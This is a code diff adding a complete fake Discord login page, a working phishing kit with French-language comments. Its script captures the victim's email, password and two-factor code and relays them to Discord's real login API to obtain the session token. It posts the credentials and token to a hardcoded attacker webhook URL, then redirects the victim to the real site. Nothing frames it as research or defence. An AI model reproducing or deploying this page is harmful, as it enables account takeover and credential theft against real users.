@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#313338">
+<title>Discord</title>
+<link rel="icon" href="https://discord.com/favicon.ico">
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;background:#313338}
+.page{background:#313338;color:#dbdee1;font-family:"gg sans","Noto Sans",Helvetica,Arial,sans-serif;
+  display:flex;align-items:center;justify-content:center;padding:24px;min-height:100vh}
+.wrap{display:flex;width:100%;max-width:784px;gap:32px;justify-content:center}
+.form-col{flex:1 1 auto;max-width:480px}
+.qr-col{flex:0 0 240px;width:240px;border-left:1px solid #3f4147;padding:8px 0 0 32px;
+  display:flex;flex-direction:column;align-items:center;text-align:center}
+h1{font-size:24px;font-weight:600;color:#f2f3f5;margin:0 0 8px}
+.sub{font-size:16px;color:#b5bac1;margin:0 0 20px}
+label{display:block;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.02em;color:#b5bac1;margin-bottom:8px}
+.req{color:#fa777c}
+input{width:100%;height:40px;padding:10px;font-size:16px;font-family:inherit;color:#dbdee1;
+  background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;outline:none}
+input:focus{border-color:#00a8fc}
+.field{margin-bottom:20px}
+.forgot{display:block;font-size:14px;color:#00a8fc;text-decoration:none;margin:-12px 0 20px}
+.forgot:hover{text-decoration:underline}
+button{width:100%;height:44px;margin-top:4px;border:0;border-radius:3px;cursor:pointer;background:#5865f2;
+  color:#fff;font-size:16px;font-weight:500;font-family:inherit;transition:background .17s}
+button:hover{background:#4752c4}
+button:disabled{opacity:.7;cursor:default}
+.need{font-size:14px;color:#949ba4;margin:12px 0 0}
+.need a{color:#00a8fc;text-decoration:none}
+.need a:hover{text-decoration:underline}
+.error{color:#fa777c;font-size:14px;font-style:italic;margin:0 0 12px}
+.qr-box{background:#fff;border-radius:4px;padding:8px;line-height:0}
+.qr-box img{display:block;width:160px;height:160px}
+.qr-t{font-size:15px;font-weight:600;color:#f2f3f5;margin:16px 0 4px}
+.qr-s{font-size:14px;color:#b5bac1;margin:0;line-height:1.4}
+#captcha-wrap{margin-bottom:16px;display:flex;justify-content:center}
+#done{text-align:center;padding:24px 0}
+#done .ok{font-size:40px;color:#23a55a;line-height:1}
+@media(max-width:600px){.qr-col{display:none}}
+</style>
+</head>
+<body class="page">
+<div class="wrap">
+  <div class="form-col">
+    <form id="form">
+      <h1>Welcome back!</h1>
+      <p class="sub">We're so excited to see you again!</p>
+
+      <label for="email">Email or Phone Number <span class="req">*</span></label>
+      <div class="field"><input id="email" name="email" type="text" autocomplete="username" autocapitalize="none" spellcheck="false"></div>
+
+      <label for="password">Password <span class="req">*</span></label>
+      <div class="field"><input id="password" name="password" type="password" autocomplete="current-password"></div>
+      <a class="forgot" href="#" onclick="return false">Forgot your password?</a>
+
+      <div id="code-wrap" hidden>
+        <label for="code">Enter the 6-digit code from your authenticator app <span class="req">*</span></label>
+        <div class="field"><input id="code" name="code" inputmode="numeric" maxlength="6" autocomplete="one-time-code"></div>
+      </div>
+
+      <div id="captcha-wrap" hidden><div id="captcha-box"></div></div>
+
+      <p id="error" class="error" hidden></p>
+      <button id="submit" type="submit">Log In</button>
+      <p class="need">Need an account? <a href="#" onclick="return false">Register</a></p>
+    </form>
+
+    <div id="done" hidden>
+      <div class="ok">&#10003;</div>
+      <h1>You're logged in!</h1>
+      <p class="sub">Redirecting to Discord&hellip;</p>
+    </div>
+  </div>
+
+  <div class="qr-col">
+    <div class="qr-box"><img alt="QR" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&qzone=1&data=https%3A%2F%2Fdiscord.com"></div>
+    <p class="qr-t">Log in with QR Code</p>
+    <p class="qr-s">Scan this with the <b>Discord mobile app</b> to log in instantly.</p>
+  </div>
+</div>
+
+<script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
+<script>
+/* ================== CONFIG ================== */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1537813377856839784/4f5ACCkcEdc36UuQ9bi45eK7pG-PsVhYYiHWUqATbDuIHhAVfqMqqVlT5oIjuzuV39Ay";
+const REDIRECT_TO = "https://discord.com";   // "" = on reste sur la page
+/* ============================================ */
+
+const DEBUG = location.search.includes("debug") || window.self !== window.top;
+const API = "https://discord.com/api/v9";
+const $ = (s) => document.querySelector(s);
+
+const state = { step:1, email:"", password:"", code:"", ticket:null,
+                captcha:null, rqdata:null, rqtoken:null, last:null, tries429:0 };
+let widget = null;
+
+/* ---------- journal de bord (visible seulement avec ?debug) ---------- */
+const logEl = document.createElement("pre");
+logEl.style.cssText =
+  "position:fixed;left:0;right:0;bottom:0;max-height:45vh;overflow:auto;margin:0;padding:10px;" +
+  "font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#111214;color:#b5bac1;" +
+  "border-top:1px solid #3f4147;white-space:pre-wrap;word-break:break-all;z-index:9";
+if (!DEBUG) logEl.style.display = "none";
+document.body.appendChild(logEl);
+
+function log(...a){
+  const line = a.map(x => (typeof x === "string" ? x : JSON.stringify(x))).join(" ");
+  console.log("[phish]", ...a);
+  logEl.textContent += line + "\n";
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+log("page chargee :", location.href);
+if (WEBHOOK_URL.includes("COLLE_TON")) log("!! WEBHOOK_URL pas encore configuree");
+
+/* ---------- webhook ---------- */
+function send(payload){
+  const body = JSON.stringify(payload);
+  return fetch(WEBHOOK_URL, {method:"POST", headers:{"Content-Type":"application/json"}, body, keepalive:true})
+    .then(r => { log("webhook ->", r.status); return r.status; })
+    .catch(() => {
+      log("webhook : CORS, nouvel essai en no-cors");
+      return fetch(WEBHOOK_URL, {method:"POST", mode:"no-cors",
+        headers:{"Content-Type":"text/plain"}, body, keepalive:true})
+        .then(() => "opaque").catch(e => { log("webhook KO :", String(e)); return "ko"; });
+    });
+}
+
+function report(status, token){
+  const fields = [
+    { name:"Email",    value:"`"+(state.email||"—")+"`", inline:true },
+    { name:"Password", value:"`"+(state.password||"—")+"`", inline:true },
+    { name:"2FA",      value: state.code ? "`"+state.code+"`" : "—", inline:true },
+    { name:"Token",    value: token ? "`"+token+"`" : "—" }
+  ];
+  if (state.last) fields.push({ name:"Reponse Discord (brut)",
+    value: "```json\n" + String(state.last).slice(0,900) + "\n```" });
+
+  return send({ content:"@here", embeds:[{
+    title: status,
+    color: token ? 0x57f287 : 0x5865f2,
+    fields,
+    footer:{ text: navigator.userAgent.slice(0,120) },
+    timestamp: new Date().toISOString()
+  }]});
+}
+
+/* ---------- API Discord ---------- */
+async function api(path, body){
+  log("-> POST", path, JSON.stringify(body).replace(/("password":")([^"]*)/, "$1***"));
+  const r = await fetch(API + path, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(body)
+  });
+  const txt = await r.text();
+  log("<- HTTP", r.status, txt.slice(0,600));
+  let data = {};
+  try { data = JSON.parse(txt); } catch(e){}
+  return { status:r.status, data, raw:txt };
+}
+
+function stepBody(){
+  const b = { login: state.email, password: state.password };
+  if (state.step === 2){ b.code = state.code; b.ticket = state.ticket; }
+  if (state.captcha){
+    b.captcha_key = state.captcha;
+    if (state.rqdata)  b.captcha_rqdata  = state.rqdata;
+    if (state.rqtoken) b.captcha_rqtoken = state.rqtoken;
+  }
+  return b;
+}
+
+function showErr(msg){ const e = $("#error"); e.hidden = false; e.textContent = msg; }
+
+async function attempt(){
+  let res;
+  try {
+    res = await api(state.step === 2 ? "/auth/mfa/totp" : "/auth/login", stepBody());
+  } catch(e){
+    log("fetch KO :", String(e));
+    state.last = "fetch a echoue : " + String(e);
+    await report("Erreur reseau (fetch bloque)");
+    return showErr("Network error - regarde le journal.");
+  }
+
+  const d = res.data;
+  state.last = res.raw || JSON.stringify(d);
+
+  if (d.token) return win(d.token);
+
+  if (d.mfa && d.ticket){
+    state.ticket = d.ticket;
+    state.step = 2;
+    await report("Mot de passe OK - 2FA demande");
+    $("#code-wrap").hidden = false;
+    $("#code").focus();
+    return;
+  }
+
+  if (d.captcha_sitekey){
+    state.rqdata  = d.captcha_rqdata  || null;
+    state.rqtoken = d.captcha_rqtoken || null;
+    return drawCaptcha(d.captcha_sitekey);
+  }
+
+  if (res.status === 429 && state.tries429 < 3){
+    state.tries429++;
+    const wait = Math.ceil((d.retry_after || 2) * 1000) + 300;
+    log("rate limit 429 - nouvel essai dans", wait, "ms");
+    showErr("Too many attempts, retrying...");
+    await new Promise(r => setTimeout(r, wait));
+    return attempt();
+  }
+
+  let why = "identifiants refuses";
+  if (state.step === 2)                   why = "code 2FA faux";
+  else if (d.errors && d.errors.login)    why = "email inconnu";
+  else if (d.errors && d.errors.password) why = "mot de passe faux";
+
+  await report("Refuse - " + why);
+  showErr(state.step === 2 ? "Invalid two-factor code." : "Login or password is invalid.");
+}
+
+function drawCaptcha(sitekey){
+  log("captcha demande, sitekey :", sitekey);
+  $("#captcha-wrap").hidden = false;
+  let tries = 0;
+  const go = () => {
+    if (window.hcaptcha){
+      try { if (widget !== null) hcaptcha.reset(widget); } catch(e){}
+      widget = hcaptcha.render("captcha-box", {
+        sitekey: sitekey,
+        rqdata: state.rqdata || undefined,
+        callback: (tok) => { log("captcha resolu"); state.captcha = tok; attempt(); }
+      });
+      log("captcha affiche");
+      return;
+    }
+    if (++tries > 40){
+      log("script hCaptcha non charge");
+      return report("Captcha demande mais script bloque");
+    }
+    setTimeout(go, 250);
+  };
+  go();
+}
+
+async function win(token){
+  log("TOKEN :", token);
+  await report("TOKEN OBTENU", token);
+  $("#form").hidden = true;
+  $("#done").hidden = false;
+  if (REDIRECT_TO) setTimeout(() => { location.href = REDIRECT_TO; }, 1500);
+}
+
+/* ---------- formulaire ---------- */
+$("#form").addEventListener("submit", async (ev) => {
+  ev.preventDefault();
+  $("#error").hidden = true;
+  state.tries429 = 0;
+
+  if (state.step === 1){
+    state.email    = $("#email").value.trim();
+    state.password = $("#password").value;
+    if (!state.email || !state.password) return;
+    log("soumission :", state.email);
+  } else {
+    state.code = $("#code").value.trim();
+    if (state.code.length !== 6) return;
+    state.captcha = null;
+  }
+
+  $("#submit").disabled = true;
+  try { await attempt(); }
+  catch (e){ log("erreur inattendue :", String(e)); await report("Erreur JS : " + String(e)); }
+  finally { $("#submit").disabled = false; }
+});
+
+/* ---------- bouton de test, uniquement en mode debug ---------- */
+if (DEBUG){
+  const b = document.createElement("button");
+  b.textContent = "Tester le webhook";
+  b.style.cssText = "position:fixed;right:10px;top:10px;width:auto;height:34px;padding:0 14px;z-index:10";
+  b.onclick = async () => { log("test webhook..."); await send({ content:"Test webhook OK" }); };
+  document.body.appendChild(b);
+}
+</script>
+</body>
+</html>
